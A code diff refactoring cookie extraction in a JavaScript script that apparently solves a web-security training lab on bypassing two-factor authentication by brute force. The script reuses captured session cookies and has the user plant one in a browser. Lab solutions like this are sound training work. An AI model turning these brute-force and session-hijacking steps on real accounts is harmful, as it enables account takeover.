@@ -3,6 +3,7 @@ import { pressEnterToContinue } from "../../../utils/pressEnterToContinue.js";
 import { runTasks } from "../../../utils/runTasks.js";
 import { sleep } from "../../../utils/sleep.js";
 import { extractCsrfToken } from "../../../utils/extractCsrfToken.js";
+import { extractCookie } from "../../../utils/extractCookie.js";
 
 const { labUrl, concurrencyLimit, httpClient } = getParsedInputFromUser({
   description: "Lab: 2FA bypass using a brute-force attack",
@@ -59,7 +60,7 @@ async function task(index) {
     console.log(
       `To solve the lab:
         1. Go to lab home page.
-        2. Edit your browser cookie for the lab site with key "session" and value "${extractSessionCookieValue(response)}",
+        2. Edit your browser cookie for the lab site with key "session" and value "${extractCookie(response, "session").value}",
         refresh the page.
         3. Go to "My account" page.`,
     );
@@ -70,7 +71,7 @@ async function task(index) {
 
 async function getFromLogin() {
   let response = await httpClient.get(labUrl + "login");
-  return [extractSessionCookie(response), extractCsrfToken(response.data)];
+  return [extractCookie(response, "session"), extractCsrfToken(response.data)];
 }
 
 async function postToLogin(sessionCookie, csrfToken) {
@@ -81,7 +82,7 @@ async function postToLogin(sessionCookie, csrfToken) {
       cookie: sessionCookie,
     },
   });
-  return extractSessionCookie(response);
+  return extractCookie(response, "session");
 }
 
 async function getFromLogin2(sessionCookie) {
@@ -108,13 +109,4 @@ function getMfaCode(index) {
 
 function isResponseSuccess(response) {
   return response.status === 302;
-}
-
-function extractSessionCookie(response) {
-  return response.headers["set-cookie"][0].split(";")[0];
-}
-
-function extractSessionCookieValue(response) {
-  const session = extractSessionCookie(response);
-  return session.split("=")[1];
 }
